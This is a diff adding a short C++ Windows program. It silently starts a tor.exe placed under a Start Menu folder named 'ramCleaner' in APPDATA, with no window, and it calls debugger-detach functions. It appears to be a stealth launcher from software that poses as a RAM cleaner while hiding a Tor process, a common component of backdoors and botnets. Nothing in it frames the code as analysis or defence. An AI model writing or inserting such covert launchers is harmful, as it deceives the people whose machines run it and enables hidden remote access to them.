@@ -1,0 +1,54 @@
+
+#include <Windows.h>
+#include <string>
+
+//int main()
+int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
+{
+    char* InstallPathBuf = 0;
+    std::string torPath = "\\Microsoft\\Windows\\Start Menu\\Programs\\ramCleaner\\tor\\tor\\tor.exe";
+
+    size_t dummy = 0;
+    if (_dupenv_s(&InstallPathBuf, &dummy, "APPDATA") == 0)
+    {
+        if (InstallPathBuf != NULL)
+        {
+            torPath = InstallPathBuf + torPath;
+            free(InstallPathBuf);
+        }
+    }
+    
+
+    // additional information
+    STARTUPINFO si;
+    PROCESS_INFORMATION pi;
+
+    // set the size of the structures
+    ZeroMemory(&si, sizeof(si));
+    si.cb = sizeof(si);
+    ZeroMemory(&pi, sizeof(pi));
+
+    // start the program up
+    CreateProcessA(
+        (LPCSTR)torPath.c_str(),   // the path
+        NULL,        // Command line
+        NULL,           // Process handle not inheritable
+        NULL,           // Thread handle not inheritable
+        FALSE,          // Set handle inheritance to FALSE
+        CREATE_NO_WINDOW,              // No creation flags
+        NULL,           // Use parent's environment block
+        NULL,           // Use parent's starting directory 
+        (LPSTARTUPINFOA)&si,            // Pointer to STARTUPINFO structure
+        &pi             // Pointer to PROCESS_INFORMATION structure (removed extra parentheses)
+    );
+    //detach debuger
+    DebugSetProcessKillOnExit(FALSE);
+    //let taregt process run free
+    DebugActiveProcessStop(pi.dwProcessId);
+    // Close process and thread handles. 
+    CloseHandle(pi.hProcess);
+    CloseHandle(pi.hThread);
+
+    return 0;
+
+}
